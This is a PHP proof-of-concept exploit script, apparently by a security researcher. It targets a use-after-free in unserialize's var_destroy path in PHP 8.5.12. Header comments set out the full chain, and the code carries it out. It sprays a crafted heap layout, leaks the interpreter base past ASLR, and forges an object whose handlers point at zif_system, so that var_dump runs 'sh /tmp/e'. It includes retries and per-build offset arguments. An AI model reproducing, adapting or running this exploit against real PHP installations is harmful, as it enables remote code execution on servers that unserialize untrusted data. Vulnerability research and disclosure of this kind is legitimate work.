<?php
// pwn_zero4_live.php — zero4 RCE, FULLY IN-BAND: no gdb, no baked addresses,
// ASLR on, plain `php -n pwn_zero4_live.php` from any cwd.
//
// Bug: var_destroy re-entry UAF (php_var_(un)serialize_destroy walks after
// freeing the var_entries chain; BG(unserialize) reuse-live during the walk)
// on released PHP 8.5.12 (fixed upstream 08f4b64, post-8.5.12).
//
// Chain (all discovered IN THE SAME PROCESS — immune to script-path drift):
//  Stage1::__destruct (fired mid-walk by the dup-key object release):
//   1. DANCE: re-entrant unserialize a:127 pre-sized mixed array reclaims the
//      freed 8160B var_entries block2 (5120B arData = same 2-page class).
//      Element pushes walk hash[0]=used_slots; elem126's slot-0 insert sets
//      hash[0]=126 so its push lands data[126] = bucket0.val.value =>
//      $arr[129] = (int)&bucket126.val => block2 = leak - 5056.
//   2. VM-slot leaks: u-calls (a:0:{}) push their result-slot pointers into
//      data[127..]: u5@130 = bucket1.val.value (LONG) => (int)&T_u5;
//      u9@134 = bucket2.val.value (STRING elem) => string at &T_u9.
//   3. BASE oracle: u-call result temps are consecutive 16B slots
//      (verified: T_u13-T_u5 == 128 for 8 calls). u10's result lands at
//      &T_u9+16 = {&zend_empty_array, IS_ARRAY}; strlen(string-at-&T_u9)
//      = *(&T_u9+16) = &zend_empty_array = BASE + 0xffe460 (plain2).
//      Verified: lo12==0, second oracle pair agrees, spacing check.
//   4. unset($arr): the engine dtor-pushed the dance array at walk slot[1]
//      (every re-entrant unserialize RESULT is tmp_var'd into the dtor hash);
//      the unset leaves rc=1 held by that slot => the walk frees block2
//      when it reaches slot[1], AFTER Stage1's slot[0].
//   5. unserialize(FIRE payload): its dup-key object's dtor entry lands at
//      slot[19] — AFTER the dance array's slot[1].
//  The walk continues: [1] dance array destroyed => block2 FREED;
//  [2..18] immutable empty arrays (no-ops); [19] FIRE::__destruct fires:
//   6. $s = str_repeat($pat, 4) (8160B => 2 pages) — first 2-page alloc
//      after the free => reclaims block2. pat[0..16] = canary fake-zval
//      pointers (R:1020/R:1021 via data[1]/data[2] = string bytes);
//      pat[16..32] = forge zval (data[3] = pat[16] self-pointer, R:1022).
//   7. R:1020/R:1021 strlen canaries verify the string landed at block2.
//   8. R:1022 => $r1 = ref -> forged zend_object {gc=1/IS_OBJECT|
//      FREE_CALLED, ce->zeros, handlers->table, num_args=1@+44,
//      arg1@+80={zend_string "sh /tmp/e", IS_STRING}}.
//   9. var_dump($r1) => handlers->get_class_name/get_debug_info(obj) =
//      zif_system(fake_execute_data) => system("sh /tmp/e")
//      => id > /tmp/pwned_zero4_live.
//
// Offsets (per-binary; plain2 8.5.12): zend_empty_array=0xffe460,
// zif_system=0x523c60 (both nm-verified). Retry envelope: attempts loop.
//
// usage: php -n pwn_zero4_live.php [attempts]

$ATTEMPTS = (int)($argv[1] ?? 5);
$FIREPAY  = (string)($argv[2] ?? 'O:4:"FIRE":0:{}');
// Per-build offsets (default: our plain2 8.5.12). For other builds extract
// with extract_syms.py (works on stripped binaries; validated on plain2).
$OFF_EMPTY_HEX = (string)($argv[3] ?? 'ffe460');
$OFF_ZIF_HEX   = (string)($argv[4] ?? '523c60');
$MARKER   = '/tmp/pwned_zero4_live';

@unlink($MARKER);
file_put_contents('/tmp/e', "id > $MARKER\n");

class D { public static string $dp = ''; public static string $fp = ''; }
class E {
    public static int $OFF_EMPTY = 0;   // set below (per-build)
    public static int $OFF_ZIF   = 0;
    public static int $block2 = 0;
    public static int $base = 0;
}
E::$OFF_EMPTY = hexdec($OFF_EMPTY_HEX);
E::$OFF_ZIF   = hexdec($OFF_ZIF_HEX);

class Stage1 {
    public function __destruct() {
        $arr = unserialize(D::$dp);
        $blk = $arr[129];
        if ($blk === 5 || !is_int($blk) || $blk < 0x10000) {
            echo "DANCE-MISS (attempt skipped)\n"; return;
        }
        $block2 = $blk - 5056;
        echo "M1 block2 = 0x", dechex($block2), "\n";

        $u2 = unserialize('a:0:{}');
        $u3 = unserialize('a:0:{}');
        $u4 = unserialize('a:0:{}');
        $u5 = unserialize('a:0:{}');
        $vm5 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 1) { $vm5 = (int)$v; } }
        if ($vm5 < 0x10000) { echo "LEAK-MISS T_u5\n"; return; }

        $u6 = unserialize('a:0:{}');
        $u7 = unserialize('a:0:{}');
        $u8 = unserialize('a:0:{}');
        $u9 = unserialize('a:0:{}');
        $vs = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 2) { $vs = $v; } }

        $u10 = unserialize('a:0:{}');
        $len_s = strlen($vs);                     // *(&T_u9+16) = &zend_empty_array

        $u11 = unserialize('a:0:{}');
        $u12 = unserialize('a:0:{}');
        $u13 = unserialize('a:0:{}');
        $vm13 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 3) { $vm13 = (int)$v; } }

        $u14 = unserialize('a:0:{}');
        $u15 = unserialize('a:0:{}');
        $u16 = unserialize('a:0:{}');
        $u17 = unserialize('a:0:{}');
        $vs2 = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 4) { $vs2 = $v; } }
        $u18 = unserialize('a:0:{}');
        $len_s2 = strlen($vs2);

        echo "M2 T_u5=0x", dechex($vm5), " T_u13=0x", dechex($vm13),
             " spacing=", ($vm13 - $vm5), "\n";
        echo "M2 ORACLE1=0x", dechex($len_s), " ORACLE2=0x", dechex($len_s2), "\n";

        if ($vm13 - $vm5 !== 128)          { echo "M2-BAIL slot spacing\n"; return; }
        if ($len_s !== $len_s2)            { echo "M2-BAIL oracle mismatch\n"; return; }
        if (($len_s & 0xfff) !== (E::$OFF_EMPTY & 0xfff)) {
            echo "M2-BAIL oracle lo12 (offset table mismatch?)\n"; return;
        }
        $base = $len_s - E::$OFF_EMPTY;
        if (($base & 0xfff) !== 0)         { echo "M2-BAIL base misaligned\n"; return; }

        E::$block2 = $block2;
        E::$base   = $base;
        echo "M2-DONE base=0x", dechex($base),
             " zif_system=0x", dechex($base + E::$OFF_ZIF), "\n";

        unset($arr);   // leave rc=1 held by dtor slot[1] => walk frees block2

        // Push FIRE's dtor entry AFTER the dance array's slot[1]:
        unserialize(D::$fp);
    }
}

class FIRE {
    public function __destruct() {
        $block2 = E::$block2; $base = E::$base;
        if (!$block2 || !$base) { echo "FIRE-BAIL no statics\n"; return; }
        $ZIF = $base + E::$OFF_ZIF;

        $V = function ($off) use ($block2) { return $block2 + 24 + $off; };
        $OBJ = $V(128); $HT = $V(600); $CE = $V(1600); $SMINI = $V(224);

        $MAGIC1 = 0x4142434445464748;
        $MAGIC2 = 0x1122334455667788;

        // Layout (pat[x] == block2+24+x == string val[x]; 2040 bytes total):
        //   pat[0..8]   data[1] -> fz1 @32 ; pat[8..16] data[2] -> fz2 @48
        //   pat[16..24] data[3] -> forge zval @64
        //   fz1 {str@80} len@96 = MAGIC1 ; fz2 {str@88} len@104 = MAGIC2
        //   forge {&OBJ, 0x108} @64 ; OBJ @128 ; SMINI @224 ; HT @600 ; CE @1600
        $pat  = pack('P', $V(32));                   // 0..8   data[1] = P1
        $pat .= pack('P', $V(48));                   // 8..16  data[2] = P2
        $pat .= pack('P', $V(64));                   // 16..24 data[3] = P3 (forge zval)
        $pat .= pack('P', $V(112));                  // 24..32 data[4] = P4 (fz3: ELF check)
        $pat .= pack('PVV', $V(80), 6, 0);           // 32..48 fz1: string @80
        $pat .= pack('PVV', $V(88), 6, 0);           // 48..64 fz2: string @88
        $pat .= pack('PVV', $OBJ, 0x108, 0);         // 64..80 forge zval {&OBJ, IS_OBJECT|RC}
        $pat .= str_repeat("\x00", 16);              // 80..96 str1 header (gc,h)
        $pat .= pack('P', $MAGIC1);                  // 96..104 str1.len
        $pat .= pack('P', $MAGIC2);                  // 104..112 str2.len (str2 header @88)
        $pat .= pack('PVV', $base - 16, 6, 0);       // 112..128 fz3: string @BASE-16 (len = *(BASE) = ELF magic)
        // OBJ @128 (also the fake zend_execute_data, rdi):
        $pat .= pack('VV', 1, 0x208);                // +0  gc rc=1, IS_OBJECT|FREE_CALLED
        $pat .= pack('VV', 0, 0);                    // +8  handle, extra_flags
        $pat .= pack('P', $CE);                      // +16 ce -> zeros
        $pat .= pack('P', $HT);                      // +24 handlers -> table
        $pat .= pack('P', 0);                        // +32 properties
        $pat .= pack('P', 0x0000000100000000);       // +40 num_args=1 @+44
        $pat .= str_repeat("\x00", 32);              // +48..80
        $pat .= pack('PVV', $SMINI, 6, 0);           // +80 arg1 = {str, IS_STRING}
        // SMINI @224 (= OBJ+96):
        $pat .= pack('VV', 1, 0x16);                 // gc rc=1, GC_STRING
        $pat .= pack('P', 0);                        // h
        $pat .= pack('P', 9);                        // len = 9
        $pat .= "sh /tmp/e\x00";                     // val
        $pat .= str_repeat("\x00", 600 - 258);       // pad to HT @600
        // HANDLERS @600 (zend_object_handlers, vdR3 layout):
        $pat .= pack('VV', 0, 0);                    // +0 offset + pad
        $pat .= pack('P', 0);                        // +8 free_obj (skipped)
        $pat .= pack('P', $ZIF);                     // +16 dtor_obj = zif_system
        $pat .= str_repeat("\x00", 136 - 24);        // ..get_class_name
        $pat .= pack('P', $ZIF);                     // +136 get_class_name = zif_system
        $pat .= str_repeat("\x00", 160 - 144);       // ..get_debug_info
        $pat .= pack('P', $ZIF);                     // +160 get_debug_info = zif_system
        $pat .= str_repeat("\x00", 208 - 168);       // rest of table
        $pat .= str_repeat("\x00", 1600 - 808);      // CE zeros 808..1600
        $pat .= str_repeat("\x00", 2040 - 1600);     // pad pattern to 2040

        $s = str_repeat($pat, 4);                    // 8160B: 2 pages, reclaims block2
        echo "M3-STR patlen=", strlen($pat), " strlen=", strlen($s),
             " first16=", bin2hex(substr($s, 0, 16)), "\n";
        flush();

        $c1z = unserialize('R:1020;');               // canary 1
        echo "M3-R1020-done\n"; flush();
        $c2z = unserialize('R:1021;');               // canary 2
        echo "M3-R1021-done\n"; flush();
        $c1 = strlen($c1z); $c2 = strlen($c2z);
        if ($c1 !== $MAGIC1 || $c2 !== $MAGIC2) {
            echo "RECLAIM-MISS c1=0x", dechex($c1), " c2=0x", dechex($c2), "\n";
            return;
        }
        echo "M3 string reclaim OK (canaries verified at block2)\n";

        $c3z = unserialize('R:1023;');               // data[4] -> fz3 -> *(BASE) ELF magic
        echo "M3-R1023-done\n"; flush();
        $c3 = strlen($c3z);
        // \x7fELF + ELFCLASS64 + ELFDATA2LSB (top byte = EI_OSABI, build-varying)
        if (($c3 & 0x00FFFFFFFFFFFFFF) !== 0x00010102464c457f) {
            echo "M3-BAIL base ELF-magic mismatch: 0x", dechex($c3),
                 " (offset table wrong for this build — clean bail)\n";
            return;
        }
        echo "M3 BASE verified via ELF magic at BASE+0\n"; flush();

        $r1 = unserialize('R:1022;');                // $r1 = ref -> fake object
        echo "M3 forged: OBJ=0x", dechex($OBJ), " HT=0x", dechex($HT),
             " zif_system=0x", dechex($ZIF), "\n";
        echo "TRIGGER var_dump(\$r1) -> zif_system(fake_execute_data)\n";
        var_dump($r1);                               // THE CALL
        echo "SURVIVED-CALL\n";
    }
}

// ---- payloads ----
$d  = 'i:129;i:5;';                    // elem0: LONG victim, key 129 (clean slot)
$d .= 'i:1028;i:1;';                   // elem1: LONG victim (u5 @data[130])
$d .= 'i:8;s:8:"AAAAAAAA";';           // elem2: STRING victim (u9 @data[134])
$d .= 'i:10;i:1;';                     // elem3: LONG victim (u13 @data[138])
$d .= 'i:12;s:8:"BBBBBBBB";';          // elem4: STRING victim (u17 @data[142])
for ($m = 5; $m <= 61; $m++) { $d .= 'i:' . (2*$m+4) . ';i:1;'; }
for ($j = 2; $j <= 65; $j++) { $d .= 'i:' . (256*$j) . ';R:1;'; }  // slot-0 chains
$d .= 'i:16896;i:1;';                  // elem126: leak push @data[126]
D::$dp = 'a:127:{' . $d . '}';
D::$fp = $FIREPAY;

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:6:"Stage1":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';

for ($try = 1; $try <= $ATTEMPTS; $try++) {
    echo "=== attempt $try ===\n";
    $r = unserialize($payload);
    echo "outer ok=", var_export($r !== false, true), "\n";
    if (is_file($MARKER)) { break; }
}
if (is_file($MARKER)) {
    echo "MARKER $MARKER:\n", trim(file_get_contents($MARKER)), "\n";
    echo "[PASS] zero4 live RCE: in-band, no gdb, ASLR on\n";
} else {
    echo "[FAIL] marker missing\n";
}
echo "SCRIPT-END\n";
